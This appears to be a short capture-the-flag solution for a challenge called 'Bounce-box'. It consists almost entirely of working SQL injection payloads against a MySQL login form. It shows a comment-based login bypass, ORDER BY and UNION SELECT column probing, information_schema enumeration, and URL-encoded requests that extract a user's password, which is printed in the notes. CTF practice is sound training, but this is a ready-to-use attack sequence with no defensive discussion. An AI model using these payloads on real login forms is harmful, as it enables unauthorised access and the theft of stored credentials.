# Bounce-box

Database is MYSQL

First Level SQli Login

```txt
username: BobbySinclusto' -- (There is a Space after the comment char)
password: 
```

Second Level get free flag

```txt
# Failed (Json Login)
username: ' order by 6 -- (There is a Space after the comment char)
password: 

# Type Of Column
' union select 'BobbySinclusto', 789459139, 127, '2018-10-12', 1; -- 

' union select 'BobbySinclusto', 789459139, 127, 1, 1; -- 


username_input=%27+union+select+%27BobbySinclusto%27%2C+789459139%2C+127%2C+1%2C+1%3B+--+&password_input=

# Actually Need 4 Item (Form Login)
username_input=BobbySinclusto%27+order+by+4;+--+&password_input=

# OK INput
username_input=BobbySinclusto%27+union+select+null%2Cnull%2Cnull%2Cnull;+--+&password_input=

# SQLI Exfiltration
# NEED TO GUEST THE INNER WORKING OF THE APP
username_input=%27+union+select+GROUP_CONCAT(COLUMN_NAME)%2C1%2C1%2CCURDATE()+from+information_schema.columns+where+TABLE_NAME='users';+--+&password_input=

# GOT PAssword
username_input=%27+union+select+password%2C1%2C1%2CCURDATE()+from+users+where+username='BobbySinclusto';+--+&password_input=

# Username: BobbySinclusto
# Password=P@$$w0rD12!
```

https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/
